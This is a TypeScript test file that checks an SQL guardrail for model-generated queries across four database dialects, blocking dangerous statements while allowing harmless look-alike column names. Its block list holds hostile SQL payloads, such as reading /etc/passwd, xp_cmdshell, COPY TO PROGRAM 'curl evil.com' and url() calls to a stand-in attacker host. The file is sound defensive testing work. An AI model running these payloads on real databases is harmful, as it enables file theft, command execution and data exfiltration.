import { describe, expect, test } from 'bun:test'
import { validateAndSanitizeLlmSql } from './guardrails'

// ryasai advertises 4 SQL dialects (PostgreSQL, MySQL, MSSQL, ClickHouse) but
// the deny-list was only ever exercised against PostgreSQL. Probing each dialect
// (trial/31, trial/32) found two things worth locking down:
//   1. ClickHouse `system.*` tables were NOT blocked — `SELECT * FROM
//      system.processes` exposes every running query on the server, including
//      other tenants' SQL. A real gap, now closed.
//   2. There were NO false positives on legitimate columns that merely share a
//      name with a dangerous function (sleep, url, file_name, remote_addr).
//      Worth pinning, because over-blocking is a functional bug, not safety: it
//      makes valid customer queries fail and burns the SQL repair loop.
//
// Scope note: this is LEXICAL matching, not SQL parsing. It is a useful filter,
// not the containment boundary — that is the DB-level read-only mode plus a
// least-privilege login. Do not treat a pass here as proof of safety.

describe('guardrails — per-dialect containment', () => {
  const mustBlock: Array<[string, string]> = [
    ['Postgres pg_read_file', "SELECT pg_read_file('/etc/passwd')"],
    ['Postgres pg_ls_dir', "SELECT pg_ls_dir('/')"],
    ['Postgres dblink', "SELECT * FROM dblink('host=evil', 'SELECT 1') AS t(x int)"],
    ['Postgres COPY TO PROGRAM', "SELECT 1; COPY t TO PROGRAM 'curl evil.com'"],
    ['MySQL LOAD DATA INFILE', "LOAD DATA INFILE '/etc/passwd' INTO TABLE t"],
    ['MySQL INTO OUTFILE', "SELECT * FROM users INTO OUTFILE '/tmp/x'"],
    ['MySQL user table', 'SELECT * FROM mysql.user'],
    ['MSSQL xp_cmdshell', "SELECT xp_cmdshell('whoami')"],
    ['MSSQL OPENROWSET', "SELECT * FROM OPENROWSET('SQLNCLI', 'x', 'SELECT 1')"],
    ['ClickHouse system table', 'SELECT * FROM system.processes'],
    ['ClickHouse system.query_log', 'SELECT * FROM system.query_log'],
    ['ClickHouse url table function', "SELECT * FROM url('http://evil.com', CSV, 'x String')"],
    ['information_schema scan', 'SELECT * FROM information_schema.tables'],
  ]

  for (const [label, sql] of mustBlock) {
    test(`blocks ${label}`, () => {
      const r = validateAndSanitizeLlmSql(sql)
      expect(r.ok).toBe(false)
    })
  }

  const mustAllow: Array<[string, string]> = [
    ['column named sleep', 'SELECT sleep FROM health_metrics LIMIT 10'],
    ['column mysql_host', 'SELECT mysql_host FROM servers LIMIT 5'],
    ['column postgres_url', 'SELECT postgres_url FROM config LIMIT 5'],
    ['column url', 'SELECT url FROM bookmarks LIMIT 10'],
    ['column file_name', 'SELECT file_name FROM uploads LIMIT 10'],
    ['table named benchmark', 'SELECT * FROM benchmark LIMIT 10'],
    ['column input_text', 'SELECT input_text FROM logs LIMIT 10'],
    ['column remote_addr', 'SELECT remote_addr FROM access_log LIMIT 10'],
    ['column named system', 'SELECT system FROM settings LIMIT 5'],
  ]

  for (const [label, sql] of mustAllow) {
    test(`allows legitimate query: ${label}`, () => {
      const r = validateAndSanitizeLlmSql(sql)
      expect(r.ok).toBe(true)
    })
  }
})
